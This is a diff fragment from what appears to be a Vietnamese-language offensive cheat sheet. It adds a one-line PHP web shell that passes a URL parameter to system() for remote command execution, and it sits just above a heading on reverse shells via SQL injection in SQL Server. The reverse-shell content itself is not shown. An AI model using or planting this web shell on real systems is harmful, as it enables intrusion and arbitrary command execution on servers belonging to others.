@@ -16,6 +16,10 @@ echo "$output";
 ?>
 ```
 
+```
+<?php system($_GET['a']); ?>
+```
+
 ### Reverse shell thông qua sqli trong sql server
 
 ```
